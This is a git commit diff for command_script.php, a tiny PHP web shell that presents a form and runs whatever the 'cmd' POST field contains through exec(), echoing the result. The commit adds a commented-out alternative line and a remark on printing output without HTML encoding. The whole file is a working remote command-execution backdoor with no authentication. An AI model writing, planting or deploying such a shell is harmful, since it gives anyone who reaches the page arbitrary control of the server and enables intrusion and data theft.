ded2556c0dec9c896e05946fbd91bf2e706f407c
tomtomgunner <tomtomgunner@hotmail.co.uk>
2015-08-13 11:00:54 +0100

    Update command_script.php

--- command_script.php
+++ command_script.php
@@ -1,4 +1,6 @@
 <?php
 echo "<form action=command_script.php method=POST><input type=text name=cmd /></form>";
 echo htmlspecialchars(exec($_POST["cmd"]));
+// echo exec($_POST["cmd"]);
+// uncomment if you do not want to HTML encode the output (e.g. if trying to view other html pages) 
 ?>
